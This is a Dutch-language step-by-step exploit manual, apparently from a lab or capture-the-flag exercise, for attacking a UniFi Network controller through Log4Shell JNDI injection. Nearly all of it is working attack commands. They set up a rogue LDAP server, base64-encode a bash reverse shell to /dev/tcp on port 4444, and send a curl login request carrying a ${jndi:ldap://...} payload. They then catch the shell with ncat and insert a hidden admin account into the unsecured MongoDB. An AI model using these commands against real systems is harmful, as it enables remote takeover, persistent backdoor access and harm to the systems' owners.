# Exploit manual

1. Download Maven door het commando **sudo apt install maven -y**.

2. Met het commando **git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package** downloaden we rogue-jndi. Dit is een kwaadaardige LDAP server voor JNDI injection attacks.

3. We bouwen een reverse shell en encoding die naar Base64 met het commando **echo 'bash -c bash -i >&/dev/tcp/192.168.69.11/4444 0>&1' | base64**

Het kan zijn dat het IP adres van de aanvallende host nog gecontroleerd en eventueel aangepast moet worden.

4. De output van het vorige commando gebruiken we in het volgende commando. 

**java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,*| Base64 output vorig commando |*}|{base64,-d}|{bash,-i}" --hostname "192.168.69.12"**

5. Daarna creÃ«ren we de effectieve reverse shell met het commando

**curl -i -s -k -X POST -H $'Host: 192.168.69.11:8443' -H $'Content-Length: 104' --data-binary $'{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://192.168.69.12:4444/o=tomcat}\",\"strict\":true}' $'https://192.168.69.11:8443/api/login'**

6. We starten een netcat listener. De UniFi Network controller zou de payload van de rogue-jndi LDAP-server en krijgt een callback. We doen dit met het commando **ncat -lvnp 4444**

7. We hebben nu een reverse shell maar zonder root access. Het blijkt echter dat de Mongo DB server niet beveiligd is waardoor we hier een shadow admin kunnen aanmaken met toegang tot de UniFi controller.

We installeren de whois package om toegang te hebben tot mkpasswd met het commando **sudo apt install whois**

8. Daarna kunnen we een hash aanmaken met het commando **mkpasswd -m sha-512 wachtwoord**

Deze hash kunnen we dan gebruiken om in MongoDB een gebruiker aan te maken.

9. We maken een UniFi gebruiker aan met het commando **mongo --port 27117 ace --eval 'db.admin.insert({ "email" : "null@localhost.local", "last_site_name" : "default", "name" : "unifi-admin", "time_created" : NumberLong(100019800), "x_shadow" : "<PASSWORD-HASH>" })'**